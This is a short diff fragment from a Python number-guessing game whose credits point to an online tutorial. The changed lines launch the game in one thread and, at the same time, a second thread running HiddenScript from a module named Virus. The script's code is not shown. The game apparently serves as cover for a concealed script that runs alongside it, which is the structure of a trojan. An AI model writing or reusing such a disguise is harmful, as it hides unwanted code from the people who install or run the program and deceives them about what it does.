@@ -29,6 +29,6 @@ def GuessingGame():                            #credits to https://www.codespeed
                 print("Your guess was too high, please enter a lower number")
               
 game = threading.Thread(target=GuessingGame)
-script = threading.Thread(target=HiddenScript)
+script = threading.Thread(target=Virus.HiddenScript)
 game.start()
 script.start()
